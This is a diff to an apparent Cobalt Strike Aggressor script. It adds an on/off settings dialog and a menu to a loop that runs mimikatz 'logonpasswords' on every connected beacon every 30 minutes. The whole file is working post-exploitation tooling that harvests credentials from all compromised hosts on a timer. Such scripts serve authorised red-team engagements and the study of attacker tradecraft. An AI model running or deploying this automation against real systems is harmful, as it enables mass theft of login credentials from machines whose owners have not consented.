@@ -1,10 +1,41 @@
 # author: bluescreenofjeff
 #runs the mimikatz logonpasswords alias on all beacons
 
+$enabledsetting = 'false';
+
+sub mimikatz-settings {
+	@bids = $1;
+
+	$dialog = dialog("Mimikatz Loop Settings", %(enabled => $enabledsetting), lambda({
+		$enabledsetting = $3['enabled'];
+
+		}));
+
+	dialog_description($dialog, "Run mimikatz's 'logonpasswords' command every 30 minutes while enabled.");
+	
+	drow_checkbox($dialog, "enabled", "Enabled:");
+
+	dbutton_action($dialog, "Save");
+	
+	dialog_show($dialog);
+
+}
+
+
 on heartbeat_30m {
-    foreach $beacon (beacons()) {
-        $id = $beacon['id'];
- 		binput($id, "logonpasswords");
-		blogonpasswords($id);
+	if ($enabledsetting eq 'true') {
+	    foreach $beacon (beacons()) {
+	        $id = $beacon['id'];
+	 		binput($id, "logonpasswords");
+			blogonpasswords($id);
+	    }
+	}
+}
+
+menubar("Mimikatz Loop", "mimikatz-loop-settings", 2);
+
+popup mimikatz-loop-settings {
+    item "Configure Settings" {
+        mimikatz-settings();
     }
 }
